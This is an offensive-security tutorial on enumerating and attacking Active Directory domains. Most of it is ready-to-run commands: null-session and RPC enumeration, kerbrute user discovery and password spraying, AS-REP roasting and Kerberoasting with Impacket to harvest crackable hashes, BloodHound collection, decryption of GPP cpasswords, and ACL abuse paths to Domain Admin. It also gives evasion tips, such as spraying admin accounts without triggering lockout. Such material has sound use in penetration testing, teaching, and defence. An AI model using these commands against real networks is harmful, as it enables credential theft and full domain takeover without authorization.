Domain Enumeration

Systematic enumeration of Active Directory domains, users, groups, computers, trusts, GPO s, and ACL s with and without domain credentials using DNS , LDAP , SMB , RPC , and BloodHound.

Overview

Active Directory stores users, groups, computers, trusts, and policies in a replicated database that any authenticated account can read over LDAP . Mapping that structure before an attack reveals which accounts are privileged, which services are Kerberoastable, and which delegation and ACL edges lead to Domain Admin. This article covers discovery without credentials, authenticated collection with LDAP and BloodHound, and the object attributes that make each attack path possible.

Understanding the Domain

Active Directory is a hierarchy of objects - users, groups, computers, policies - managed by Domain Controllers and stored in a multi-master replicated database exposed through LDAP . Before you can attack a domain, you must understand its structure. Enumeration is the process of mapping that structure: discovering what exists, how it is organized, and who has power over what.

A diagram of the logical hierarchy:

Forest (forest root domain + child domains, shared schema/configuration/GC)
├── Domain Tree 1: corp.example.com
│   ├── OUs: Accounts / Servers / Workstations / Groups / ServiceAccounts / Admins
│   └── Child Domain: us.corp.example.com
└── Domain Tree 2: subsidiary.example.com (separate tree in same forest)
Concept Definition
Forest The security boundary. All objects in a forest share a common schema, configuration partition, and at least one Global Catalog. A forest can contain multiple domain trees.
Domain An administrative boundary for users, groups, computers. Each domain has its own Domain Controllers and replication scope. The forest root domain is the first domain created; it hosts the Enterprise Admins and Schema Admins groups.
Domain Tree A parent domain and its child domains, sharing a contiguous DNS namespace (e.g. corp.example.com -> us.corp.example.com -> ny.us.corp.example.com).
Trust A relationship between domains that allows authentication across domain boundaries. Trusts within a forest are transitive two-way by default. External/Forest trusts may be one-way or two-way.
Organization Unit (OU) A container for grouping objects for administrative delegation and GPO application. OUs are the primary mechanism for delegating control.
Domain Controller (DC) A server that hosts a writable copy of the domain database, authenticates users, and enforces security policy. The PDC Emulator role owner is the authoritative time source and password change notification server.
Global Catalog (GC) A partial, read-only replica of every object in the forest. The GC contains a subset of attributes for all objects (including cross-domain/cross-tree). Essential for forest-wide searches, Universal Group membership resolution, and UPN-based logons.
Security Identifier (SID) Every security principal (user, group, computer) has a unique SID. Format:S-1-5-21-<DOMAIN-RID>-<OBJECT-RID>. Built-in RIDs: Administrator=500, Guest=501, Domain Admins=512, Domain Users=513, Domain Computers=515, Domain Controllers=516. 
# A human-readable Domain SID looks like:
# S-1-5-21-1122334455-1122334455-1122334455-500  (Administrator)
#   -------- --------------------------  ---
#     SID    Domain Identifier           RID
#
# Well-known SIDs (machine-local, same on every Windows install):
# S-1-5-18      SYSTEM (LocalSystem)
# S-1-5-19      LOCAL SERVICE
# S-1-5-20      NETWORK SERVICE
# S-1-5-32-544  Builtin\Administrators
# S-1-5-32-545  Builtin\Users
# S-1-5-32-551  Builtin\Backup Operators
#
# Domain-scoped well-known RIDs:
# RID 500  →  Administrator (the domain Administrator account)
# RID 501  →  Guest
# RID 502  →  krbtgt (Kerberos KDC service account — THE high-value target)
# RID 512  →  Domain Admins group
# RID 513  →  Domain Users group
# RID 514  →  Domain Guests group
# RID 515  →  Domain Computers group
# RID 516  →  Domain Controllers group
# RID 518  →  Schema Admins group (forest root domain only)
# RID 519  →  Enterprise Admins group (forest root domain only)
# RID 520  →  Group Policy Creator Owners
# RID 526  →  Key Admins
# RID 527  →  Enterprise Key Admins

Understanding these RIDs is essential: when you see a SID ending in -500, you know you have the Administrator account. When you see -502, you know the krbtgt account is in play - that's the Golden Ticket target.

Enumeration Without Domain Credentials

No domain credentials? No problem. AD exposes significant information through DNS , SMB , LDAP anonymous binds, and protocol-level behavior. The Kerberos protocol itself leaks user existence.

DNS Service Record Discovery

Every Domain Controller registers SRV records so clients can find services. These records are publicly resolvable if you can reach the DNS server on UDP 53 or TCP 53. 

# Discover the Primary Domain Controller (PDC) — the PDC FSMO role holder
dig SRV _ldap._tcp.pdc._msdcs.domain.local @10.0.0.1

# Discover all Domain Controllers via LDAP service records
dig SRV _ldap._tcp.domain.local @10.0.0.1

# Discover Kerberos KDC (Key Distribution Center) — port 88
dig SRV _kerberos._tcp.domain.local @10.0.0.1

# Discover Kerberos password change service — port 464
dig SRV _kpasswd._tcp.domain.local @10.0.0.1

# Discover Global Catalog servers — port 3268 (LDAP), 3269 (LDAPS)
dig SRV _gc._tcp.domain.local @10.0.0.1

# Often the DC is both the DNS server and LDAP/KDC — test if the DNS server
# itself resolves AD zones. Try a zone transfer (rarely works, always worth trying):
dig AXFR domain.local @10.0.0.1
						
# Composite discovery: ask the DC for all relevant SRV records in one sweep
DOMAIN="domain.local"
DC="10.0.0.1"
for SRV in "_ldap._tcp.${DOMAIN}" "_ldap._tcp.pdc._msdcs.${DOMAIN}" \
           "_kerberos._tcp.${DOMAIN}" "_kpasswd._tcp.${DOMAIN}" \
           "_gc._tcp.${DOMAIN}" "_ldap._tcp.dc._msdcs.${DOMAIN}"; do
    echo "=== $SRV ==="
    dig +short SRV "$SRV" @"$DC"
done

Expected output: Each SRV record returns priority weight port hostname . The hostname reveals the FQDN of each Domain Controller. Collect every DC hostname and IP - you will need them for every subsequent step. 

# Resolve each DC hostname to an IP
dig +short A dc01.domain.local @10.0.0.1
dig +short A dc02.domain.local @10.0.0.1

# Also resolve the domain name itself — usually points to a DC
dig +short A domain.local @10.0.0.1

LDAP Anonymous Binds - RootDSE Queries

The RootDSE is the root of the LDAP directory tree. It is accessible with an anonymous bind on most domains unless hardened. RootDSE exposes the forest name, domain name, naming contexts, supported SASL mechanisms, and LDAP version - all without any credentials. 

# Install openldap on ArchLinux for the ldapsearch binary
sudo pacman -S openldap

# Query RootDSE with anonymous bind (-x = simple auth, no credentials)
ldapsearch -x -H ldap://10.0.0.1 -s base -b "" "(objectclass=*)" \* + 2>/dev/null

Key attributes in the RootDSE response:

Attribute Meaning
rootDomainNamingContext The base DN of the forest root domain (e.g.DC=corp,DC=local)
defaultNamingContext The base DN of the domain this DC belongs to (same as rootDNC for forest root)
configurationNamingContext CN=Configuration,...- forest-wide config, site topology, partitions
schemaNamingContext CN=Schema,...- attribute and class definitions
supportedSASLMechanisms GSSAPI,GSS-SPNEGO,EXTERNAL- tells you Kerberos is available
supportedLDAPVersion Should be3
dnsHostName The DCs own FQDN (e.g.dc01.corp.local)
ldapServiceName corp.local:dc01$@CORP.LOCAL
serverName Distingished Name of the server object
domainControllerFunctionality Domain functional level (e.g.7= Windows Server 2016)
forestFunctionality Forest functional level
isSynchronized TRUEif the DC has completed its initial replication
highestCommittedUSN Update Sequence Number - for tracking replication state 
# Extract the naming contexts alone — this gives you the base domain and forest DN
ldapsearch -x -H ldap://10.0.0.1 -s base -b "" "(objectclass=*)" \
    defaultNamingContext configurationNamingContext rootDomainNamingContext 2>/dev/null | \
    grep -E 'namingContext|NamingContext'

# Output example:
# defaultNamingContext: DC=corp,DC=local
# configurationNamingContext: CN=Configuration,DC=corp,DC=local
# rootDomainNamingContext: DC=corp,DC=local

The DC=corp,DC=local format tells you the domain's Distinguished Name (DN) components. A DN with DC=us,DC=corp,DC=local would indicate a child domain us.corp.local .

SMB Null Sessions

A null session connects to the SMB service on a Windows host without providing credentials (empty username, empty password). On older configurations or misconfigured servers, this exposes shares, users, groups, and security policies. 

# Enumerate SMB shares without credentials
smbclient -L //10.0.0.1 -N

# Expected output on a hardened DC (2016+):
# Anonymous login successful
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# IPC$            IPC       Remote IPC
# NETLOGON        Disk      Logon server share
# SYSVOL          Disk      Logon server share
# Reconnecting with SMB1 for workgroup listing.
# Unable to connect with SMB1 -- SMB1 disabled (expected on modern systems)

The presence of SYSVOL and NETLOGON confirms this is a Domain Controller - these shares store Group Policy templates and logon scripts. Access them read-only if the null session grants it: 

# List contents of SYSVOL (Group Policy files)
smbclient //10.0.0.1/SYSVOL -N -c "ls"

# List contents of NETLOGON (login scripts — often contain domain user mappings)
smbclient //10.0.0.1/NETLOGON -N -c "ls"

enum4linux-ng Null Sessions

enum4linux-ng is a Python rewrite of the classic enum4linux Perl script. It automates SMB null session enumeration: share listing, user enumeration, group enumeration, RID cycling, password policy extraction, OS detection. 

# Install
yay -S enum4linux-ng
# or: pacman -S enum4linux-ng  (if in community)
# or: pip install enum4linux-ng

# Full enumeration against a target
enum4linux-ng -A 10.0.0.1

# Break down what -A does:
# -S : OS detection via SMB   (reads the Native OS / Native LanMan fields)
# -U : user listing via RID cycling (SAMR)
# -R : RID cycling — brute-force SIDs 500-550 to enumerate built-in users
# -G : group listing
# -P : password policy extraction
# -O : domain/workgroup info
# -N : NetBIOS name table (nbstat)
						
# If null sessions are blocked, try with guest credentials
enum4linux-ng -A -u "guest" -p "" 10.0.0.1

# Targeted RID cycling — only enumerate a specific range (faster, quieter)
enum4linux-ng -R 500-2000 10.0.0.1

# Extract password policy — reveals lockout threshold, minimum password length,
# password history, and maximum password age. CRITICAL for planning password spray attacks.
enum4linux-ng -P 10.0.0.1

Example password policy output:

Domain Password Information:
  Password history length: 24
  Minimum password length: 8
  Minimum password age: 1 day 0 hours 0 minutes
  Maximum password age: 42 days 0 hours 0 minutes
  Password properties:
    DOMAIN_PASSWORD_COMPLEX: 1      # Must meet complexity requirements
    DOMAIN_PASSWORD_NO_ANON_CHANGE: 1
    DOMAIN_PASSWORD_NO_CLEAR_CHANGE: 1
    DOMAIN_LOCKOUT_ADMINS: 0         # Admin accounts are NOT subject to lockout
    DOMAIN_PASSWORD_STORE_CLEARTEXT: 0
    DOMAIN_REFUSE_PASSWORD_CHANGE: 0
  Lockout threshold: 5
  Lockout duration: 30 minutes
  Lockout observation window: 30 minutes

Key takeaway from this output: if DOMAIN_LOCKOUT_ADMINS is 0 (default on many domains), admin accounts do not get locked out. You can spray passwords against Domain Admins indefinitely

  • the highest-impact password spray target.

RPC Endpoint Mapper - rpcclient

The RPC Endpoint Mapper listens on TCP 135 and tells you which RPC services are running on which dynamic ports. rpcclient speaks the SAMR (Security Account Manager Remote) protocol over a named pipe to enumerate users and groups. 

# Connect with a null session
rpcclient -U "" -N 10.0.0.1

# Once connected, run these commands:
rpcclient $> srvinfo             # OS version, domain role
rpcclient $> enumdomusers        # List all domain users (RID + username)
rpcclient $> enumdomgroups       # List all domain groups (RID + group name)
rpcclient $> querygroup 512      # Get members of Domain Admins (RID 512)
rpcclient $> querygroupmem 512   # Same — membership of group by RID
rpcclient $> queryuser 500       # Get info for Administrator (RID 500)
rpcclient $> getdompwinfo        # Password policy (same info as enum4linux -P)
rpcclient $> lsaquery            # Get domain SID and name
rpcclient $> lookupnames admin*  # Resolve a wildcard username to RID
rpcclient $> querydispinfo       # List users with description fields
rpcclient $> enumdrivers         # Enumerate installed printer drivers
rpcclient $> netshareenum        # Enumerate shares
rpcclient $> netsharegetinfo SYSVOL  # Get details on a specific share
						
# Non-interactive rpcclient — chain commands with -c
rpcclient -U "" -N 10.0.0.1 -c "lsaquery; enumdomusers; enumdomgroups; getdompwinfo"

The lsaquery command gives you the domain SID: 

LSA Query Info
Domain Name: CORP
Domain Sid: S-1-5-21-1122334455-1122334455-1122334455

Write this SID down. You need it for Golden Ticket attacks, Silver Ticket attacks, and BloodHound analysis.

Kerberos User Enumeration - kerbrute

The Kerberos pre-authentication step leaks valid usernames. When a user exists but the password is wrong, the K DC returns KDC_ERR_PREAUTH_FAILED . When a user does not exist, the K DC returns KDC_ERR_C_PRINCIPAL_UNKNOWN . This timing/response difference enables brute-force user enumeration against the K DC on port 88 without triggering Windows event log 4771 (Kerberos pre-auth failure) for nonexistent users

  • there is no event because no ticket request is created.

kerbrute is a Go tool that enumerates users via this mechanism. It is fast (thousands of usernames per second), does not trigger lockouts (no password is attempted), and is quiet (no logon failure events). 

# Install kerbrute on ArchLinux
yay -S kerbrute
# or manually: go install github.com/ropnop/kerbrute@latest

# User enumeration — supply a wordlist of potential usernames
kerbrute userenum -d corp.local --dc 10.0.0.1 /usr/share/wordlists/usernames.txt

# Output:
# [+] VALID USERNAME:  administrator@corp.local
# [+] VALID USERNAME:  jsmith@corp.local
# [+] VALID USERNAME:  svc_sql@corp.local
# [+] VALID USERNAME:  backup_svc@corp.local
# [X] INVALID:         nonexistent@corp.local
						
# Generate a username wordlist from common first/last name combinations
# If you have a list of employee names from OSINT (LinkedIn, company website):
while IFS=' ' read -r first last; do
    echo "${first,,}${last,,}"           # janesmith
    echo "${first,,}.${last,,}"          # jane.smith
    echo "${first:0:1}${last,,}"         # jsmith
    echo "${first:0:1}.${last,,}"        # j.smith
    echo "${last,,}${first:0:1}"         # smithj
    echo "${first,,}"                     # jane
    echo "${last,,}"                      # smith
done < employee_names.txt | sort -u > usernames.txt

# Also add common service account and default account names:
# administrator, guest, krbtgt, sqlsvc, sqlservice, backup, svc_backup,
# svc_sql, svc_mssql, svc_web, svc_sharepoint, svc_exchange, helpdesk,
# scanner, nessus, qualys, monitor, nagios, zabbix, admin_*, *_admin
						
# kerbrute also performs password spraying (use AFTER user enumeration)
kerbrute passwordspray -d corp.local --dc 10.0.0.1 \
    --userfile valid-users.txt 'Spring2024!'  # single password against all users

# kerbrute can also spray from a password list, but single-password-per-spray
# is the correct approach — one password across all users, not vice versa
kerbrute passwordspray -d corp.local --dc 10.0.0.1 \
    --userfile valid-users.txt 'Password123'

# Bruteforce — one user, many passwords (will trigger lockouts, use sparingly)
kerbrute bruteuser -d corp.local --dc 10.0.0.1 \
    /usr/share/wordlists/passwords.txt administrator

AS-REP Roasting Enumeration

GetNPUsers.py from Impacket requests an AS-REQ without pre-authentication for users who have the UF_DONT_REQUIRE_PREAUTH flag set. Even when you provide no password, the K DC returns an AS-REP containing encrypted data crackable offline. The tool can also query LDAP (if you have credentials) to list all users with this flag.

Without credentials, you can supply a list of usernames and the tool will test each one:

# Install impacket
sudo pacman -S python-impacket

# Without credentials: test a username list for AS-REP-roastable users
GetNPUsers.py -no-pass -dc-ip 10.0.0.1 corp.local/ -usersfile valid-users.txt

# Output for roastable users:
# $krb5asrep$23$jsmith@CORP.LOCAL:ab12cd34...hash...
# (Save this hash — crack with hashcat -m 18200)
						
# With credentials: LDAP query for all users with UF_DONT_REQUIRE_PREAUTH
GetNPUsers.py -dc-ip 10.0.0.1 corp.local/user:password -request

# With credentials + output each hash to a file
GetNPUsers.py -dc-ip 10.0.0.1 corp.local/user:password -request -outputfile asrep-hashes.txt

Enumeration With Domain Credentials

Once you have valid credentials for even the lowest-privileged domain user, the attack surface explodes. Any authenticated user can query LDAP for domain objects. Most domains do not restrict LDAP read access to object attributes - even Guest can list every user, group, computer, and GPO .

LDAP Queries with ldapsearch

# Authenticated LDAP search with simple bind
# -x = simple authentication
# -D = bind DN (user@domain format or CN=User,CN=Users,DC=corp,DC=local)
# -w = password (use -W to prompt interactively to avoid shell history leakage)
# -b = search base (the namingContext from RootDSE)
# -H = LDAP URI

# List all users in the domain
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(objectclass=user)" \
    cn samaccountname distinguishedname memberof useraccountcontrol mail \
    2>/dev/null | grep -v '^#' | grep -v '^$'

# List all groups
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(objectclass=group)" \
    cn samaccountname distinguishedname member 2>/dev/null | grep -v '^#'

# List all computers
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(objectclass=computer)" \
    cn samaccountname operatingsystem operatingsystemservicepack lastlogontimestamp dnsHostName \
    2>/dev/null | grep -v '^#'

# List all OUs
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(objectclass=organizationalUnit)" \
    ou distinguishedname 2>/dev/null | grep -v '^#'

User Account Control (UAC) Flags

The userAccountControl attribute is a bitmask. Each bit represents a boolean property of the user account. Understanding these bits lets you identify disabled accounts, accounts with non-expiring passwords, accounts trusted for delegation, and more. 

userAccountControl = 512  →  NORMAL_ACCOUNT (default new user)
userAccountControl = 514  →  ACCOUNTDISABLE + NORMAL_ACCOUNT
userAccountControl = 66048 → DONT_EXPIRE_PASSWORD + NORMAL_ACCOUNT
userAccountControl = 544 → PASSWD_NOTREQD + NORMAL_ACCOUNT
userAccountControl = 528384 → TRUSTED_FOR_DELEGATION + WORKSTATION_TRUST_ACCOUNT
Flag Name Value Meaning
SCRIPT 0x0001 (1) Logon script will run
ACCOUNTDISABLE 0x0002 (2) Account is disabled
HOMEDIR_REQUIRED 0x0008 (8) Home folder required
LOCKOUT 0x0010 (16) Account is locked out
PASSWD_NOTREQD 0x0020 (32) No password required (dangerous)
PASSWD_CANT_CHANGE 0x0040 (64) User cannot change password
ENCRYPTED_TEXT_PWD_ALLOWED 0x0080 (128) Store password under reversible encryption (same as cleartext)
TEMP_DUPLICATE_ACCOUNT 0x0100 (256) Local account for users of another domain
NORMAL_ACCOUNT 0x0200 (512) Default account type (user object)
INTERDOMAIN_TRUST_ACCOUNT 0x0800 (2048) Trust between two domains
WORKSTATION_TRUST_ACCOUNT 0x1000 (4096) Computer account
SERVER_TRUST_ACCOUNT 0x2000 (8192) Domain Controller's computer account
DONT_EXPIRE_PASSWORD 0x10000 (65536) Password never expires
MNS_LOGON_ACCOUNT 0x20000 (131072) Majority Node Set logon
SMARTCARD_REQUIRED 0x40000 (262144) Smart card required for interactive logon
TRUSTED_FOR_DELEGATION 0x80000 (524288) Unconstrained delegation allowed
NOT_DELEGATED 0x100000 (1048576) CANNOT be delegated (protection flag)
USE_DES_KEY_ONLY 0x200000 (2097152) Only DES encryption for Kerberos
DONT_REQ_PREAUTH 0x400000 (4194304) Kerberos pre-authentication NOT required (AS-REP roastable)
PASSWORD_EXPIRED 0x800000 (8388608) Password has expired
TRUSTED_TO_AUTH_FOR_DELEGATION 0x1000000 (16777216) Protocol Transition (S4U2self) with constrained delegation 
# Find all accounts with AS-REP roast potential
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    cn samaccountname useraccountcontrol 2>/dev/null

# 1.2.840.113556.1.4.803 is the LDAP_MATCHING_RULE_BIT_AND rule
# It performs a bitwise AND and returns objects where any flag matches

# Find all accounts trusted for unconstrained delegation
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
    cn samaccountname 2>/dev/null

Kerberoastable Service Accounts

SPN s map a service to a user or computer account. When a user requests a TGS for an SPN , the K DC encrypts the service ticket with the service account's Kerberos key (derived from its password). If the service runs as a domain user, the ticket can be cracked offline - this is Kerberoasting .

Every SPN in the domain represents a potentially crackable service account credential. 

# Enumerate all SPNs in the domain
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=user)(servicePrincipalName=*))" \
    cn samaccountname serviceprincipalname memberof distinguishedname 2>/dev/null

# Common SPN formats and what they reveal:
# HTTP/webserver.corp.local          → IIS or web service
# MSSQLSvc/sql01.corp.local:1433     → SQL Server (standard port)
# MSSQLSvc/sql01.corp.local:49732    → SQL Server (dynamic port — likely a named instance)
# TERMSRV/ts01.corp.local            → Terminal Services / Remote Desktop
# HOST/computer.corp.local           → Host SPN (present on every computer account)
# CIFS/fileserver.corp.local         → File server (SMB)
# exchangeMDB/ex01.corp.local        → Exchange Server
# WSMAN/computer.corp.local          → WinRM (PowerShell Remoting)
# vssvc/computer.corp.local          → Volume Shadow Copy service
# oracle/orcl.corp.local             → Oracle Database
						
# Also use Impacket's GetUserSPNs.py for a cleaner SPN listing
GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password

# Request a TGS ticket for every SPN (Kerberoast) — IMPACKET
GetUserSPNs.py -dc-ip 10.0.0.1 corp.local/jsmith:password -request -outputfile kerberoast-hashes.txt

# Output file contains entries like:
# $krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$ab12...hash...
# Hashcat mode: -m 13100 (RC4-HMAC) or -m 19700 (AES256)

BloodHound Data Collection

BloodHound is the most effective tool for understanding privilege relationships in Active Directory. It does not enumerate objects individually - it maps relationships: who has sessions on what machine, who is a member of what group, who has what ACL rights over what object.

The ingestor collects this data by running LDAP queries, checking local admin group memberships, and resolving group memberships recursively. 

# Install BloodHound (the GUI) and the Python ingestor
yay -S bloodhound
pip install bloodhound  # Provides the bloodhound-python ingestor

# Run the Python ingestor from Linux — all collection methods
bloodhound-python \
    -d corp.local \
    -u jsmith \
    -p 'password' \
    -gc dc01.corp.local \
    -c All \
    -ns 10.0.0.1 \
    --zip \
    -dc dc01.corp.local

# -c All : Collect all group memberships, user properties, computer properties,
#          sessions, ACLs, trusts, GPOs, and container structure
# --zip  : Output as a single ZIP file ready for import into BloodHound GUI

# If you cannot resolve DNS names from your attacker machine:
bloodhound-python \
    -d corp.local \
    -u jsmith \
    -p 'password' \
    -ns 10.0.0.1 \
    -dc dc01.corp.local \
    -gc dc01.corp.local \
    -c All \
    --dns-tcp \
    --zip

# Collection methods breakdown:
# Group           →  group memberships (recursive)
# LocalAdmin      →  local admin group memberships on each computer
# Session         →  who is logged into what machine (NetSessionEnum)
# ACL             →  access control entries on all objects
# Trusts          →  intra-forest and inter-forest trusts
# ObjectProps     →  object attributes (SPNs, UAC, OS, etc.)
# Container       →  OU/container hierarchy
# DCOM            →  DCOM user/computer list
# RDP             →  Remote Desktop Users local group membership
# PSRemote        →  PowerShell Remoting group membership

BloodHound Path to Domain Admin

Once the data is loaded, BloodHound's graph analysis answers the questions that would take hours of manual analysis:

"Shortest Path to Domain Admins" - the most commonly used query. Finds which compromised user provides the shortest path to members of the Domain Admins group.

Common attack paths revealed by BloodHound:

1. User has LocalAdmin on Workstation → DA has Session on that Workstation
   → Steal DA token/credential from the workstation → DA access

2. User has GenericAll on a group → add self to group → group is a member of DA
   → DA access

3. User has ForceChangePassword on a DA member → change DA's password
   → DA access (by logging in as the DA)

4. User has WriteDacl on a GPO applied to a DA's machine → modify GPO to
   run a startup script → DA's machine executes script on boot → DA access

5. User is a member of Account Operators → can modify any non-privileged
   account → compromise a user with a path to DA → DA access

6. User has AddAllowedToAct/GenericWrite on a computer where DA has session
   → abuse Resource-Based Constrained Delegation → DA access
						
# BloodHound Custom Cypher queries (run in the Raw Query panel):

# Find all users with SPNs (kerberoastable)
MATCH (u:User {hasspn: true}) RETURN u.name, u.serviceprincipalnames

# Find all computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation: true}) RETURN c.name

# Find all users with constrained delegation
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate

# Find all users with DONT_REQ_PREAUTH (AS-REP roastable)
MATCH (u:User {dontreqpreauth: true}) RETURN u.name

# Find all Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u.name

# Find all groups with 'Admin' in the name
MATCH (g:Group) WHERE g.name CONTAINS 'ADMIN' RETURN g.name

# Find computers where Domain Admins have sessions
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'})
MATCH (u)-[:HasSession]->(c:Computer)
RETURN u.name, c.name

# Find users with GenericAll on the Domain Admins group
MATCH (u1:User)-[r:GenericAll]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u1.name

Group Enumeration - Key Groups

Understanding group hierarchy is essential. Here are the groups every red teamer should know:

Group RID Why It Matters
Domain Admins 512 Can administer any machine in the domain, including DCs. The primary goal of most red team engagements.
Enterprise Admins 519 Can administer any domain in the forest. Exists only in the forest root domain, but its members are granted membership in every domain's Domain Admins group.
Schema Admins 518 Can modify the AD schema (add new attributes/classes). Exists only in the forest root domain.
Administrators 544 Built-in local admin on a specific server. Domain Admins are automatically members.
Account Operators 548 Can create/modify/delete users and groups EXCEPT administrative accounts/groups. Path to DA via targeted privilege escalation.
Backup Operators 551 Can back up and restore files, including NTDS.dit (the domain database) via shadow copies. Path to DCSync.
Server Operators 549 Can log onto a DC locally, start/stop services, manage shares, and backup files.
DNS Admins - Can manage DNS server. Often allows DLL loading on the DNS server (which is typically a DC) -> SYSTEM on DC.
Print Operators 550 Can manage printers, load/unload printer drivers on DCs -> kernel-mode driver load -> SYSTEM on DC.
Remote Desktop Users 555 Can RDP to a machine. If a DA uses RDP and leaves a session, session hijacking may be possible.
Protected Users 525 A hardened group. Members cannot use NTLM, DES, or RC4 for Kerberos. CredSSP and wdigest are disabled. Kerberos delegation cache is not supported. 
# ldapsearch query for group membership (Domain Admins example)
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(&(objectclass=group)(samaccountname=Domain Admins))" \
    cn samaccountname member 2>/dev/null

# Resolve member DNs to samaccountnames
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "CN=Administrator,CN=Users,DC=corp,DC=local" \
    "(objectclass=user)" samaccountname 2>/dev/null

Computer Enumeration

Computers in AD have attributes that reveal their purpose, patch level, and activity:

ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(objectclass=computer)" \
    cn samaccountname operatingsystem operatingsystemversion lastlogontimestamp \
    pwdlastset whencreated dnsHostName serviceprincipalname \
    2>/dev/null | grep -v '^#' | grep -v '^$'

Key computer attributes:

Attribute Meaning
operatingSystem Human-readable OS (e.g.Windows Server 2019 Standard)
operatingSystemVersion Numeric version (e.g.10.0 (17763))
lastLogonTimestamp Last interactive logon (replicated, up to 14-day lag). If recent, the machine is actively used.
dnsHostName FQDN of the computer

GPO Enumeration

Group Policy Objects apply configuration (scripts, startup items, registry changes, security settings) to users and computers. A single GPO applied to a Domain Controller can run arbitrary code as SYSTEM on every DC . GPO s are stored in \\domain.local\SYSVOL\domain.local\Policies\{GUID}\ . 

# Enumerate all GPOs via LDAP
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(objectclass=groupPolicyContainer)" \
    cn displayname distinguishedname gPCFileSysPath 2>/dev/null | grep -v '^#'

# GPCFileSysPath example:
# gPCFileSysPath: \\corp.local\SysVol\corp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
# This GUID {6AC1786C-016F-11D2-945F-00C04FB984F9} is the Default Domain Policy

# List GPO contents (if a null session or credential gives SMB access):
smbclient //10.0.0.1/SYSVOL -U "corp.local/jsmith%password" \
    -c "recurse; ls"

# Key GPO files to look for in the Machine/User subdirectories:
# registry.pol      →  registry-based policy settings
# Groups.xml        →  local group membership definitions (often contains passwords)
# Services.xml      →  service configuration (can specify RunAs credentials)
# ScheduledTasks.xml → scheduled task definitions
# Scripts/          →  logon/logoff/startup/shutdown scripts
# DriveMaps.xml     →  mapped network drives
# DataSources.xml   →  ODBC data sources
						
# Extract cPassword from Groups.xml (decryptable — MS14-025)
# The cpassword field in Groups.xml is AES-256-CBC encrypted with a static key
# published by Microsoft. Any cpassword found is trivially decryptable.
# Use the gpp-decrypt tool (from impacket):
gpp-decrypt "cpassword_value_from_Groups.xml"

# Or search SYSVOL for cpassword strings:
smbclient //10.0.0.1/SYSVOL -U "corp.local/jsmith%password" \
    -c "recurse; prompt OFF; mget *" 2>/dev/null
grep -r "cpassword" SYSVOL_contents/  # path varies by mount

Trust Enumeration

Trusts allow authentication across domain boundaries. A trust from Domain A to Domain B means Domain B trusts Domain A - users from Domain A can access resources in Domain B. 

# LDAP query for all trusted domains
ldapsearch -x -H ldap://10.0.0.1 \
    -D "jsmith@corp.local" -w 'password' \
    -b "DC=corp,DC=local" \
    "(objectclass=trustedDomain)" \
    cn distinguishedname trustAttributes trustDirection trustType \
    trustPartner flatName securityIdentifier 2>/dev/null

Trust attribute reference:

Attribute Values Meaning
trustDirection 0 = disabled, 1 = inbound, 2 = outbound, 3 = bidirectional Who trusts whom
trustType 1 = downlevel (NT4), 2 = uplevel (AD), 3 = MIT (Kerberos realm), 4 = DCE (old) The technology
trustAttributes bitmask: 1 = non-transitive, 2 = uplevel only, 4 = quarantined (SID filtering), 8 = forest transitive, 16 = cross-org, 32 = intra-forest, 64 = treat as external, 128 = RC4 encryption, 1024 = PIM trust Trust properties 
# Impacket's Get-ADTrust.py (part of Impacket scripts)
# Lists trusts with resolved direction and attributes
python3 /usr/share/doc/python-impacket/examples/Get-ADTrust.py \
    -dc-ip 10.0.0.1 corp.local/jsmith:password

Critical : If trustAttributes does NOT have bit 4 (quarantined/SID filtering), SID history forgery is possible across the trust. You can inject a SID from Domain A into a Kerberos ticket for Domain B, and if Domain B trusts Domain A, you get access as that SID in Domain B.

ACL Privilege Escalation Paths

Access Control Entries (ACEs) on domain objects grant permissions to users and groups. Certain ACEs grant rights that can be abused for privilege escalation:

ACE Right Abuses
GenericAll Full control over the object. Can reset a user's password, add self to a group, modify group membership.
GenericWrite Write to any property. Can write toservicePrincipalNameto perform targeted Kerberoasting, or writelogonScriptto execute code on next login.
WriteOwner Change the owner of the object. Once owner, grant selfGenericAll.
WriteDACL Modify the object's ACL (add new ACEs). Grant selfGenericAll.
AllExtendedRights All extended rights. IncludesForceChangePassword(reset user password without knowing the old one).
ForceChangePassword Reset the user's password.
AddMember/AddSelf Add a member to a group. Add yourself.
Self Write-validated right. Can add self to groups viaSelf-Membership.
